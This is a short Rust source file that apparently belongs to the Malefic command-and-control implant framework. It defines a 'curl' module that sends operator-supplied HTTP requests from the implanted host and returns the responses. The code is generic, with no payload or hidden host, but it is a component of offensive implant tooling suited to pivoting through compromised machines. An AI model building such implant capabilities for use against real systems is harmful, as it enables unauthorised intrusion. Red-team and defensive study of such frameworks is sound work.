use async_trait::async_trait;
use malefic_helper::{debug, to_error};
use malefic_modules::{
    check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult,
};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_trait::module_impl;
use std::str::FromStr;
use surf::http::headers::{HeaderName, HeaderValue};

pub struct Curl {}

#[async_trait]
#[module_impl("curl")]
impl Module for Curl {}

#[async_trait]
impl ModuleImpl for Curl {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let request = check_request!(receiver, Body::CurlRequest)?;

        let client = surf::Client::new();
        let mut req = client.request(to_error!(request.method.parse())?, &request.url);

        for (key, value) in request.header {
            if let (Ok(header_name), Ok(header_value)) =
                (HeaderName::from_string(key), HeaderValue::from_str(&value))
            {
                req = req.header(header_name, header_value);
            }
        }

        if !request.body.is_empty() {
            req = req.body(request.body);
        }
        let mut response = to_error!(req.send().await)?;
        let body = to_error!(response.body_bytes().await)?;

        Ok(TaskResult::new_with_body(
            id,
            Body::BinaryResponse(malefic_proto::proto::modulepb::BinaryResponse {
                data: body.to_vec(),
                message: Vec::new(),
                err: String::new(),
                status: response.status() as i32,
            }),
        ))
    }
}

